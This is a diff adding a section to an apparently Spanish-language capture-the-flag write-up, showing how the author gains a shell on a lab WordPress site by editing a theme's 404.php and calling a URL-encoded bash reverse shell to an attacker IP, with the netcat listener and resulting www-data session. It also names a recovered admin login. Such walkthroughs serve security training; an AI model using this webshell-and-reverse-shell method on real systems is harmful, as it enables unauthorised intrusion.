@@ -209,9 +209,45 @@ Enunciado :
 
           Tras loguearnos con los diferentes usuarios obtenidos anteriormente, el unico que tiene permisos de administrador es el usuario --> wp_yura:soccer13
 
-## Obtenemos Shell mediante Wordpress.
+## Obtenemos Shell mediante Wordpress(RCE).
 
-         
+- Una vez logueados, editamos el fichero 404.php con el siguiente codigo php.
+
+  ![image](https://github.com/Esevka/CTF/assets/139042999/b41b8a01-da26-4447-97aa-8c37fe44ba13)
+
+- Ejecutamos comando a traves de la URL.
+
+  ![image](https://github.com/Esevka/CTF/assets/139042999/7e1ae089-9610-424c-b811-1feb5dca1f54)
+
+- Obtenemos Shell.
+
+  Nos ponemos en escucha y ejecutamos la reverse shell desde la URL
+    
+      ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/wekor]
+      └─# rlwrap nc -lnvp 1988
+      listening on [any] 1988 ...
+  
+      ---
+      http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/404.php/?cmd=bash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.9.92.151%2F1988%200%3E%261%27
+      ---
+  
+      ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/wekor]
+      └─# rlwrap nc -lnvp 1988
+      listening on [any] 1988 ...
+      connect to [10.9.92.151] from (UNKNOWN) [10.10.122.78] 48462
+      bash: cannot set terminal process group (1093): Inappropriate ioctl for device
+      bash: no job control in this shell
+      <r.thm/wordpress/wp-content/themes/twentytwentyone$
+      id
+      uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+  Proceso:Upgrade shell
+
+  ![image](https://github.com/Esevka/CTF/assets/139042999/3bc5c76e-96c5-40d2-a879-c8529df725dc)
+
+##Escalada Horizontal de privilegios www-data to Orka
+
+
       
          
            
